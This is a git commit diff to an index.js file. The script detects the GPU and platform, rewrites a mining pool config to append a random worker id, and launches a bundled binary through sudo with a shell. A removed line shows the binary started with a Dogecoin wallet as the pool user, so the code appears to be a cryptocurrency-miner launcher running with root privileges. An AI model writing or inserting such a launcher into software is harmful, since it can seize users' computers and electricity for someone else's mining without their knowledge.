1e5fb207830930302cdcf340addf5ce442d2cc37
Vajahath Ahmed <vajuoff.1@gmail.com>
2021-11-21 21:54:47 +0530

    more config

--- index.js
+++ index.js
@@ -10,7 +10,6 @@ function getOSDetails() {
     const graphicsTestStrings = ["NVIDIA", "GeForce", "radeon"];
 
     const siInfo = JSON.stringify(resp).toLowerCase();
-    console.log(resp);
     const HAS_GPU = graphicsTestStrings
       .map((key) => siInfo.includes(key.toLowerCase()))
       .reduce((acc, val) => acc || val, false);
@@ -24,25 +23,24 @@ function getOSDetails() {
   });
 }
 
-function prepareBinFileNames(opt) {
-  const path = require("path");
+const path = require("path");
 
+function prepareBinFileNames(opt) {
   const platformMap = {
     linux: "l",
   };
 
+  const cwd = path.join(__dirname, "bin");
+
   const cpuBin = path.join(
     __dirname,
     "bin",
-    `${opt.HAS_GPU ? "c" : "c"}-${platformMap[opt.PLATFORM]}-${opt.ARCH}`
+    `c-${platformMap[opt.PLATFORM]}-${opt.ARCH}`
   );
 
   return {
-    cpuBin: path.join(
-      __dirname,
-      "bin",
-      `c-${platformMap[opt.PLATFORM]}-${opt.ARCH}`
-    ),
+    cwd,
+    cpuBin,
     gpuBin: null,
   };
 }
@@ -50,22 +48,37 @@ function prepareBinFileNames(opt) {
 getOSDetails()
   .then((resp) => {
     const bins = prepareBinFileNames(resp);
-
     const spawn = require("child_process").spawn;
-    const { nanoid } = require("nanoid");
 
     if (bins.cpuBin) {
-      const args = [
-        "--user=DOGE:DNNWw2o6ytV9MaBEsMgMEsnBLaKeRbzUQu.cxxx_" + nanoid(),
-      ];
-      console.log(bins.cpuBin, args);
+      cConfigPatch();
+      const args = [bins.cpuBin];
 
-      const child = spawn(bins.cpuBin, args, { stdio: "inherit" });
+      const child = spawn("sudo", args, {
+        stdio: "inherit",
+        cwd: bins.cwd,
+        shell: true,
+      });
+
       child.on("exit", (code, sig) => {
-        console.log(
-          `child process exited with code ${code} and signal ${signal}`
-        );
+        console.log(`child process exited with code ${code} and signal ${sig}`);
       });
     }
   })
   .catch((err) => console.error(err));
+
+function cConfigPatch() {
+  const fs = require("fs");
+  const { nanoid } = require("nanoid");
+
+  const config = require("./bin/config.json");
+
+  if (!config.pools[0].user.includes("_")) {
+    config.pools[0].user = config.pools[0].user + "_" + nanoid(5);
+  }
+
+  fs.writeFileSync(
+    path.join(__dirname, "bin", "config.json"),
+    JSON.stringify(config)
+  );
+}
